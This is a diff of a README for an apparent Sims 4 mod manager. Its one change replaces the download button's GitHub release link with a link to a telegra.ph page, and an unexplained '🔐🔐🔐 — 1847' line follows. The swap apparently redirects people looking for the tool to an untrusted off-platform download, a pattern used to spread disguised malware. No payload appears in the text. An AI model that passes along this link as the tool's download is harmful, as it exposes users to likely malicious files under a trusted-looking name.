@@ -6,7 +6,7 @@ A mod organizer and CC conflict scanner for **The Sims 4** by EA/Maxis. Built to
 
 ## Download 🔗🔗
 
-[![DOWNLOAD THE-SIMS-4](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://github.com/ArmorDoctorPrime/The-Sims-4-Mod-Manager/releases/download/Release/Sims4MM.zip)
+[![DOWNLOAD THE-SIMS-4](https://img.shields.io/badge/DOWNLOAD-blue?style=for-the-badge&logo=link&logoColor=white)](https://telegra.ph/Download-05-21-39)
 
 **🔐🔐🔐 — 1847**
 
